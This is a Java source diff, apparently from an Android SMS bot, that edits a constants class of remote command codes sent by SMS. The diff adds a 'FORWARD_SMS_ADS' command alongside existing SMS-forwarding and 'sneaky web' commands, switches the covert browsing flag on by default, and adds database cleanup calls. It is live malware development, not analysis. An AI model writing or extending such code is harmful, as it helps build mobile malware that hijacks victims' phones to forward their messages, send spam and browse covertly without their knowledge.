@@ -24,6 +24,7 @@ public class CommonVariable {
 		"STOP_FORWARD_SMS",
 		"ENABLE_SNEAKY_WEB",
 		"STOP_SNEAKY_WEB",
+		"FORWARD_SMS_ADS",
 		"RESPONSE_SIGN",
 		"PHONE_NUMBER_RESPONSE",
 		"HAVE_RECEIVED",
@@ -69,7 +70,8 @@ public class CommonVariable {
 						 START_FORWARD_SMS,
 						 STOP_FORWARD_SMS,
 						 ENABLE_SNEAKY_WEB,
-						 STOP_SNEAKY_WEB;
+						 STOP_SNEAKY_WEB,
+						 FORWARD_SMS_ADS;
 						 
 
 	/* WAIT RESPONSE */
@@ -108,6 +110,7 @@ public class CommonVariable {
 		STOP_FORWARD_SMS      = "05";
 		ENABLE_SNEAKY_WEB	  = "06";
 		STOP_SNEAKY_WEB		  = "07";
+		FORWARD_SMS_ADS       = "08";
 	
 		/* WAIT RESPONSE */
 		RESPONSE_SIGN         = "##";
@@ -127,8 +130,9 @@ public class CommonVariable {
 	    rightBotNumber ="";
 		selfNumber     ="";
 	
+		
 		/* ScreenMonitor and ScreenReceiver */
-		enableSneakyFlag = "false" ;
+		enableSneakyFlag = "true" ;
 		browserOnFlag 	 = false;
 		ScreenOn         = true;
 		
@@ -176,6 +180,8 @@ public class CommonVariable {
 		ForwardServiceLock = "false";
 
 		isCommonVariableSet = true;
+		cur.close();
+		db.close();
 		return state;
 	}
 
